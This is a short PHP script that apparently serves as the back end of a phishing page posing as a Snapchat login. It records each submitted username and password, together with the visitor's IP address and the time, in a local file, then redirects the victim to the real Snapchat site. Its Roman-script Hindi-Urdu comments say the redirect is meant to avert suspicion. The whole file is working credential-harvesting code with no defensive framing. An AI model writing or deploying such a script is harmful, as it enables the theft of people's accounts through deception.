<?php
$username = $_POST['username'];
$password = $_POST['password'];

// Credentials ko file mein save karo
$file = fopen("creds.txt", "a");
fwrite($file, "Snapchat Credentials:\n");
fwrite($file, "Username/Email: " . $username . "\n");
fwrite($file, "Password: " . $password . "\n");
fwrite($file, "IP: " . $_SERVER['REMOTE_ADDR'] . "\n");
fwrite($file, "Date: " . date("Y-m-d H:i:s") . "\n");
fwrite($file, "-------------------------\n");
fclose($file);

// Target ko real Snapchat par bhej do taake suspicion na ho
header("Location: https://www.snapchat.com");
exit();
?>